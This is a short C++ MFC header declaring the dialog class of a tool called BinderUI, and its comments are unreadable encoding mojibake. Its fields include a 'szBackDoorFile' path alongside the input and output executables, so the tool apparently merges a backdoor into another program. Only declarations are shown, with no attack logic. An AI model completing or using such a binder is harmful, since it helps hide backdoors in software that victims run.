
// BinderUIDlg.h : ͷ�ļ�
//

#pragma once


// CBinderUIDlg �Ի���
class CBinderUIDlg : public CDialogEx
{
// ����
public:
	CBinderUIDlg(CWnd* pParent = NULL);	// ��׼���캯��

// �Ի�������
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_BINDERUI_DIALOG };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV ֧��


// ʵ��
protected:
	HICON m_hIcon;

	// ���ɵ���Ϣӳ�亯��
	virtual BOOL OnInitDialog();
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:
	afx_msg void OnBnClickedButton1();
public:
	TCHAR szExeFile[MAX_PATH];
	TCHAR szOutFile[MAX_PATH];
	TCHAR szSrcExeFile[MAX_PATH];
	TCHAR szDatFile[MAX_PATH];
	TCHAR szBackDoorFile[MAX_PATH];
	int flags;
	afx_msg void OnBnClickedButton3();
	afx_msg void OnBnClickedButton2();
};
